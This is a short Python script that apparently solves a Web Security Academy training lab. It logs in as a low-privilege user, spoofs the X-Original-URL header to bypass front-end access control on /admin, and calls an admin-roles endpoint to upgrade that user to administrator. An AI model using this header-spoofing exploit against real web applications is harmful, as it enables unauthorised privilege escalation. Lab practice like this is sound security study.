import requests
'from bs4 import BeautifulSoup'
s = requests.Session()

site = 'acd41f091e45dabb807f177f00db009c.web-security-academy.net'

login_url = f'https://{site}/login'
login_data = { 'password' : 'peter', 'username' : 'wiener'}
resp = s.post(login_url, data=login_data)

url = f'https://{site}/?username=administrator'
resp = s.get(url, headers = {'X-Original-URL' : '/admin'})
print(resp.text)

upgrade_data = {
    'action' : 'upgrade',
    'username' : 'wiener'
}
url = f'https://{site}/admin-roles/?username=wiener&action=upgrade'
resp = s.get(url, headers = {'X-Original-URL' : '/admin', 'username' : 'admininstrator'})
print(resp.text)
resp = s.get(url, data = upgrade_data)
print(resp.status_code)
print(resp.text)